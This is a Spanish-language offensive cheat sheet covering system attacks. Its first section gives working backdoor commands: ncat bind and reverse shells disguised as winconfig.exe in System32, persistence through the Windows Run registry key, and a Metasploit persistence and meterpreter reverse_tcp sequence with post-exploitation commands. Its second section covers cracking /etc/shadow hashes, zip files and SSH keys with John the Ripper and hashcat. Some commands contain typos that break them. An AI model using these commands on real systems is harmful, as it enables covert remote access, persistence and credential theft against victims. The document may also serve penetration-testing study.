# System Attacks Cheat Sheet

- [Backdor](#backdoor)
  - [Ncat](#ncat)
    - [Ejemplo básico](#ncat-ejemplo-1)
    - [Cliente conectándose a la máquina atacante y entregando una shell](#ncat-ejemplo-2)
    - [Backdoor persistente](#ncat-ejemplo-3)
  - [Metasploit con sesión en Meterpreter](#metasploit-meterpreter)
- [Cracking offline](#cracking-offline)
  - [John The Ripper](#john)
    - [Ejemplo de cracking hashes de usuarios en entornos Unix](#john-2)
    - [Opciones para ver los resultados del john](#john-3)
    - [Ejemplo de cracking archivo zip](#john-4)
    - [Ejemplo de cracking archivo RSA SSH](#john-5)
    - [Ejemplo de cracking de un usuario en específico usando fuerza bruta](#john-6)
    - [Ejemplo de cracking de usuarios en específicos usando un diccionario y reglas](#john-7)
  - [UNSHADOW](#unshadow)
  - [Hashcat](#hashcat)
    - [Realizar prueba Benchmark](#hashcat-2)
    - [Prueba usando diccionario](#hashcat-3)
    - [Uso de Rule-based attack](#hashcat-4)
    - [Uso de fuerza bruta (Mask attack)](#hashcat-5)

<h2 id="backdoor">Backdoor</h2>

<h3 id="ncat"><a href="https://nmap.org/ncat/">Ncat</a></h3>

Utilidad de red que permite leer y escribir datos a través de la red usando la CLI.

Para la utilización de esta herramienta en la victima, se recomienda cambiar su nombre, con la finalidad de no levantar sospechas (ejemplo: usar el nombre winconfig.exe, y guardarlo en System32).

`ncat [option]`

```
-l: Se deja al equipo en modo escucha
-p [port]: Se define el puerto con el cual se trabajará
-e [exe]: Archivo a ejecutar cuando se inicie la comunicación entre servidor y cliente
-v: Verbose
```

<h4 id="ncat-ejemplo-1">Ejemplo básico</h4>

Servidor windows, escuchando en el Puerto 5555 y al momento de iniciar la comunicación iniciará el software CMD:

`wincofig -l -p 5555 -e cmd.exe`

Cliente linux que obtiene una shell desde la máquina windows:

`ncat 192.168.1.200 -p 5555`

<h4 id="ncat-ejemplo-2">Cliente conectándose a la máquina atacante y entregando una shell</h4>

Atacante:

`ncat -l -p 5555 -v`

Víctima:

`winconfig -e cmd.exe 192.168.1.100 5555`

<h4 id="ncat-ejemplo-3">Backdoor persistente</h4>

Atacante:

`ncat -l -p 5555 -v`

Víctima:

1. run > regedit
2. Ir a HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
3. Clic derecho > New > String Value
4. Ingresar los siguientes datos:
  - `Name=winconfig`
  - `Data=”C:\Windows\System32\winconfig.exe 192.168.1.100 5555 –e cmd.exe”`

> Para que esto funcione, el usuario debe logearse en su cuenta. Una vez logeado, se iniciará el backdoor.

<h3 id="metasploit-meterpreter">Metasploit con sesión en Meterpreter</h3>

```bash
# Módulo que permite crear una tarea programada en el target
use exploit/Windows/local/s4u_persistence
# Configuración de la session, la cual, puede ser conocida con el comando sessions
# Para saber que opción se debe configurar, usar el comando show options
# Esta sesión se debería obtener con una explotación previa a la máquina objetivo.
set session 1
# Se iniciará esta tarea cuando el usuario inicie sesión
set trigger logon
# Utilización del payload que carga un meterpreter con shell reversa
set payload windows/meterpreter/reverse_tcp
# Configuración de la IP local
set lhost 192.168.1.100
# Configuración del puerto local
set lport 5555
# Ejecución del exploit en la sesión 1 para cargar la tarea programada instalando una shell reversa que entrega un meterpreter
exploit
# Luego de cargar la shell reversa, usar el siguiente exploit que permite quedar a la escucha del inicio de la sesión del objetivo
use exploit/multi/handler
# Configurar el payload para usar un reverse shell TCP con meterpreter
set payload windows/meterpreter/reverse_tcp
# Volver a configurar estas opciones si es que se desconfiguraron, validar con el commando show options
set lhost 192.168.1.100
set lport 5555
# Iniciar el exploit para escuchar la comunicación entrante del objetivo
exploit
```

Luego de la explotación, se pueden ejecutar los siguientes comandos desde la terminal de meterpreter:

```bash
ifconfig
# Los screenshots son guardados en /root (en Kali)
screenshot
pwd
ls
cd
cat
download c:\\flag.txt /root/flags
upload evil_trojan.exe c:\\windows\\system32
sysinfo
ps
help
```

<h2 id="cracking-offline">Cracking offline</h2>

<h3 id="john">John The Ripper</h3>

JTR o John, es una herramienta que es utilizada para realizar cracking offline de archivos y passwords. John posee varios scripts para pasar de un formato a formato John.

`john --wordlist=[wordlist] [option] [file_to_crack]`

```
--format=[file_format]: Opcional. Indicar el tipo de formato del archivo, para saber los formatos soportados con esta opción, usar --list=formats
--users:[user_list]: Indicar que usuarios del archivo se quieren crackear
--incremental[=mode]: Modo de crackeo que intenta todas las combinaciones de carácteres posibles
--rules[=rules_file]: Habilita las reglas
```

<h4 id="john-2">Ejemplo de cracking hashes de usuarios en entornos Unix</h4>

```
unshadow /etc/passwd /etc/shadow > hashes
john --wordlist=/usr/share/john/password.lst hashes
```

<h4 id="john-3">Opciones para ver los resultados del john</h4>

```
cat /root/.john/john.pot
john --show hashes
```

<h4 id="john-4">Ejemplo de cracking archivo zip</h4>

```
zip2john cipher.zip > cipherHash
john --format=zip --wordlist=/usr/share/wordlists/rockyou.txt cipherHash
```

<h4 id="john-5">Ejemplo de cracking archivo RSA SSH</h4>

```
python /usr/share/john/ssh2john.py id_rsa > sshCrack.txt
john --format=ssh --wordlist=/usr/share/wordlists/rockyou.txt sshCrack.txt
```

<h4 id="john-6">Ejemplo de cracking de un usuario en específico usando fuerza bruta</h4>

`john --incremental --user:root hashes`

<h4 id="john-7">Ejemplo de cracking de usuarios en específicos usando un diccionario y reglas</h4>

`john --wirdlist=/usr/share/wordlists/rockyou.txt --rules --user:root,w0lff4ng hashes`

<h3 id="unshadow">UNSHADOW</h3>

Herramienta que viene incorporada con JTR, la cual, permite combinar la información de los archivos passwd y shadow.

`unshadow /etc/passwd /etc/shadow > [file_name]`

```
/etc/passwd: Este fichero registra los usuarios del sistema
/etc/shadow: Fichero que almacena las password cifradas del sistema
```

<h3 id="hashcat">Hashcat</h3>

Herramienta de recuperación de contraseñas, la cual permite crackear múltiples tipo de algoritmos.

Se recomienda que al usar hashcat, esta se encuentre instalada en la máquina host, y no en una VM.

`hashcat.exe [option] [hash] [attack_mode]`

> [Option](https://hashcat.net/wiki/doku.php?id=hashcat#options)

```
-b: Realizar una prueba Benchmark
-m [number]: Especificar el tipo de hash
-a [number]: Modo de ataque
-D [string]: Tipo de dispositivo a usar
-r [file_name.rule]: Regla a usar
```

<h4 id="hashcat-2">Realizar prueba Benchmark</h4>

`hashcat.exe -b`

<h4 id="hashcat-3">Prueba usando diccionario</h4>

`hascat.exe -m 0 -a 0 -D 2 example0.hash example.dic`

<h4 id="hashcat-4">Uso de <a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">Rule-based attack</a></h4>

`hascat.exe -m 0 -a 0 -D 2 example0.hash example.dic -r rule\best64.rule`

<h4 id="hashcat-5">Uso de fuerza bruta (<a href="https://hashcat.net/wiki/doku.php?id=mask_attack">Mask attack</a>)</h4>

En el siguiente [link](https://hashcat.net/wiki/doku.php?id=mask_attack#built-in_charsets) se pueden ver la combinación de carácteres:

```
hashcat.exe -m 0 -a 3 example0.hash ?L?L?L?L?L?L?L?L?a
hashcat.exe -m 0 -a 3 example0.hash ?a?a?a?a?a?a?a?a?a
```
